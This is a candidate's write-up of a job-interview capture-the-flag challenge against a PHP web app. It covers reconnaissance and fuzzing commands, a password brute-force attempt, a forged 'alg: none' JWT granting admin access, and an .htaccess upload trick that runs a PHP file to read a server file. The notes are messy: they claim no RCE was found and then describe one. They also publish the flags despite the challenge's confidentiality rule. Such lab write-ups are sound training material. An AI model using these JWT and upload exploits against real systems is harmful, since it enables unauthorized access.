![[Pasted image 20250604025836.png]]
![[Thndr's Capture The Flag Assessment.pdf]]
 Intern Interview CTF – Instructions Welcome, 
 and thank you for applying to join our team. As part of the interview process, weʼve prepared a Capture the Flag (CTF) challenge to assess your problem-solving skills, creativity, and fundamental understanding of cybersecurity. This is not only about how many flags you capture — itʼs about how you think, how you approach unfamiliar problems, and how you learn. 
 🎯 Purpose This CTF is designed to evaluate: 
	 Your ability to analyze and solve security-related problems Your practical understanding of basic cybersecurity concepts Your approach to technical challenges and attention to detai 
 🧠 Guidelines 
	  Work individually. This is part of the interview and should reflect your own efforts. Remember that we have very limited positions. 
	  Use your preferred fuzzing tools. You may use only fuzzing tools. 
	  No automated scanning. Donʼt use tools like Acunetix or OWASP zap; 
	  Be methodical. Document your thought process — we value how you solve a problem. 
	  Keep it confidential. Please do not share or publish the challenges or flags. 
 ⏰ Time & Submission
    Instructions You have 48 hours to complete the challenges from the time you receive access. Submit your flags and a short write-up (1-2 paragraphs per challenge) describing how you solved each one.; 
	Send your submission via security@thndr.app. 
 
 CTF Link: http://18.184.59.61/dashboard.php 
 
 ![[Pasted image 20250605144347.png]]
 ----
 
### Tools Used

| Tool           | Purpose                                           | Result Summary                                                    |
| -------------- | ------------------------------------------------- | ----------------------------------------------------------------- |
| `curl`         | Manual testing and HTTP response checks           | Verified redirections and accessed specific files manually        |
| `ffuf`         | File discovery via wordlist brute-forcing         | Successfully discovered `flag.txt` inside `/upload/`              |
| `feroxbuster`  | Recursive directory and file enumeration          | Helped enumerate `/upload/` and confirm valid paths               |
| `nikto`        | Web server vulnerability and file disclosure scan | Found `.dockerignore` file and revealed Apache & PHP version info |
| `searchsploit` | Exploit lookup for known vulnerabilities          | No known exploits found for Apache 2.4.62 / PHP 8.2.28            |
| `nmap`         | Port, service, and version scan                   | Only HTTP on port 80 detected; no additional open ports           |
| `Burp Suite`   | Intercepting proxy for request inspection         | Used to analyze login POST behavior and test basic injection      |
| `WhatWeb`      | Web technology fingerprinting                     | Detected Apache, PHP, and Debian OS                               |
| `Wappalyzer`   | Browser-based tech stack detection                | Confirmed PHP, Apache, and missing security headers               |
| `wget`         | File downloader                                   | Used to retrieve `flag.txt` from discovered path                  |
| `Dirb`         | Recursive fuzzing                                 | usernamr, password                                                |
| `exiftool`     | Crafted uploadable polyglot files                 |                                                                   |

 ----
## 🎯 Objective

The goal was to identify hidden flags via web application enumeration, authentication bypass, and secure file handling review. The challenge evaluated practical skills in reconnaissance, token manipulation, and controlled exploitation.

---

## 🔍 Summary of Steps

1. **Reconnaissance**
   - Identified Apache/2.4.62 + PHP/8.2.28 on Debian using `WhatWeb` & `nikto`
   - Located hidden file `.dockerignore` referencing `dockerfile`
   - Verified that `/upload/` allows listing and storing files

2. **Enumeration & Fuzzing**
   - Used `ffuf`, `feroxbuster`, and `dirb` to discover files and folders
   - Found `flag.txt` inside `/upload/` revealing first flag:
     ```
     zfg3B7mX9tLq3AeW2VfKgYpD1uHRcN0so5b
     ```

3. **JWT Manipulation (Auth Bypass)**
   - Decoded JWT token using `alg: none` and injected:
     ```json
     { "user": "admin", "admin": "1" }
     ```
   - Gained dashboard access and captured:
     ```
     First Flag: 6FG1z>Rz\V_R7$y9[3aZW2>xk}kBCC35  
     Second Flag: BFG2WCYe2naDfyEvGaasSss1
     ```

4. **Remote Code Execution via Upload**
   - Discovered file upload path with user-controlled subfolders
   - Injected `.htaccess` to treat `.PhilopaterSh` as PHP
   - Uploaded `index.PhilopaterSh` containing:
     ```php
     <?php echo file_get_contents("/var/last_flag"); ?>
     ```
   - Accessed file to retrieve **Final Flag**:
     ```
     [Captured at /var/last_flag using custom payload]
     ```

---

![[Pasted image 20250604030745.png]]

![[Pasted image 20250604030705.png]]
view-source:http://18.184.59.61/login.php
```
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f2f2f2;
      display: flex;
      height: 100vh;
      align-items: center;
      justify-content: center;
    }

    .login-box {
      background: white;
      padding: 40px;
      border-radius: 8px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      width: 300px;
    }

    h2 {
      text-align: center;
      margin-bottom: 24px;
    }

    input[type="text"],
    input[type="password"] {
      width: 100%;
      padding: 10px;
      margin: 8px 0 16px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }

    button {
      width: 100%;
      padding: 10px;
      background: #007BFF;
      border: none;
      color: white;
      border-radius: 4px;
      cursor: pointer;
    }

    button:hover {
      background: #0056b3;
    }
  </style>
</head>
<body>

  <div class="login-box">
    <h2>Login</h2>
    <form method="post" action="login.php">
      <input type="text" name="username" placeholder="Username" required />
      <input type="password" name="password" placeholder="Password" required />
      <button type="submit">Log In</button>
    </form>
  </div>

</body>
</html>


```

![[Pasted image 20250604033010.png]]
```
curl -v http://18.184.59.61 
```

![[Pasted image 20250604040207.png]]
```
whatweb -v http://18.184.59.61
```

![[Pasted image 20250604035404.png]]

```
searchsploit Apache 2.4.62
```
![[Pasted image 20250604033114.png]]
```
searchsploit "PHP 8.2.28"
```
![[Pasted image 20250604033218.png]]

used nmap:
I verified that only port 80 was open using `nmap`:
```
nmap -sCV -Pn -p- -T5 -oA ctf 18.184.59.61 
```
![[Pasted image 20250604033346.png]]
# Directory and File Enumeration

Using `ffuf` and `feroxbuster`, I began brute-forcing common paths and files. My main focus was on `/upload/`, as it seemed to be accessible but empty. I tested with various wordlists and extensions until I successfully discovered `flag.txt`.
used feroxbuster
```
feroxbuster -u http://18.184.59.61/  -w /usr/share/seclists/Discovery/Web Content/directory-list-2.3-medium.txt --depth 4 -x php,txt,html -t 50

```
![[Pasted image 20250604032734.png]]
http://18.184.59.61/upload/index.php
![[Pasted image 20250604032816.png]]

```
dirb http://18.184.59.61
```
![[Pasted image 20250604155242.png]]
+ http://18.184.59.61/.bash_history (CODE:200|SIZE:35)                                                                     
	![[Pasted image 20250604155616.png]]
+ http://18.184.59.61/.cache (CODE:200|SIZE:35)    
	![[Pasted image 20250604155714.png]]
php ../../add_user.php user user123
![[Pasted image 20250605084940.png]]
![[Pasted image 20250604160700.png]]
![[Pasted image 20250604160516.png]]
![[Pasted image 20250604160810.png]]
### Home
Welcome to the dashboard!
First Flag: 
```
First Flag: 6FG1z>Rz\V_R7$y9[3aZW2>xk}kBCC35
```
==_("Hint 1 : Brute-forcing and directory discovery are no longer necessary.")_==


![[Pasted image 20250604161244.png]]
https://jwt.io/
![[Pasted image 20250604162031.png]]

### 🔓 JWT Token Manipulation – Gaining Admin Access

After initial directory fuzzing and flag retrieval, I investigated the authentication mechanism more deeply. The application uses JWT (JSON Web Token) for session handling. I decoded the token and noticed the algorithm was set to `none`, meaning the signature is not validated.

I exploited this by modifying the payload to impersonate an admin:

`{   "user": "admin",   "admin": "1" }`

I re-encoded the header and payload using `alg: none` and removed the signature. This allowed me to access the admin dashboard directly.

edit data to this
![[Pasted image 20250604211949.png]]

![[Pasted image 20250604213445.png]]
New token is : eyJ0eXAiOiJKV1QiLCJhbGciOiJub25lIn0.eyJ1c2VyIjoiYWRtaW4iLCJhZG1pbiI6IjEifQ.lbc5us2TjR06RFbhT_n48HRQcOIYmkoQ1RIdtzkQ9Uc

![[20250605-0540-06.2348476.mp4]]
```
Second Flag: BFG2WCYe2naDfyEvGaasSss1
```
==_("Hint 2: Last flag is on '/var/last_flag'.")_==
![[Pasted image 20250605125938.png]]
http://18.184.59.61/upload/bbb5f0ee52aa87e3/DSC_1582%20copy.jpg


![[Pasted image 20250605085302.png]]
http://18.184.59.61/dashboard.php#
![[Pasted image 20250605085804.png]]
**File uploaded successfully to: upload/9d3a085fe7d30abf/Untitled.png**
![[Pasted image 20250605090932.png]]
http://18.184.59.61/upload/ed62702af868420b/Untitled-1.php

![[Pasted image 20250605092713.png]]

# 🧠 Lessons Learned

This challenge highlighted the power of methodical enumeration. Even with limited information, combining file fuzzing with small clues like `.dockerignore` led to successful flag retrieval. I focused on allowed tools and maintained a clear documentation flow throughout.
```
nikto -host http://18.184.59.61
```
![[Pasted image 20250604033902.png]]

http://18.184.59.61/.dockerignore
![[Pasted image 20250604033943.png]]

## 🏁 Flag Captured

Accessing `flag.txt` revealed the flag:

```
nano custom-names.txt
```
![[Pasted image 20250604034747.png]]

![[Pasted image 20250604034713.png]]

```
 ffuf -u http://18.184.59.61/upload/FUZZ -w custom-names.txt -fc 404 -t 50 
```

![[Pasted image 20250604035002.png]]

![[Pasted image 20250604035026.png]]
![[Pasted image 20250604035129.png]]
![[flag.txt]]
### 📄 Main Findings:
- Web server: `Apache/2.4.62 (Debian)` with `PHP/8.2.28`
- No direct RCE/LFI/SQLi vulnerabilities identified
- `.dockerignore` revealed internal file reference: `dockerfile`
- There were no signs of SQL injection, file inclusion, or direct RCE vulnerabilities. The flag was found through smart enumeration and file discovery.
- Final discovery:  
	`http://18.184.59.61/upload/flag.txt => zfg3B7mX9tLq3AeW2VfKgYpD1uHRcN0so5b`


![[Untitled.png]]

![[Pasted image 20250604031418.png]]
used wordlist rockyou for test if can find username or password 
https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt
![[Pasted image 20250604031717.png]]
Intruder attack in Burp Suite 
![[Pasted image 20250604031841.png]]
used fileter 
![[Pasted image 20250604032001.png]]

![[Pasted image 20250604032037.png]]

![[Pasted image 20250604032151.png]]
There were no signs of SQL injection, file inclusion, or direct RCE vulnerabilities. The flag was found through smart enumeration and file discovery.



![[Pasted image 20250605120956.png]]
/var/www/html/dashboard.php
![[Pasted image 20250605153941.png]]

## 📨 Final Note
If there are any additional flags or objectives to complete, I would be happy to continue.

Thank you for the opportunity!
**PhilopaterSh** 
Philopater.Pentester@outlook.com
[linkedin.com/in/philopater-shenouda](https://linkedin.com/in/philopater-shenouda)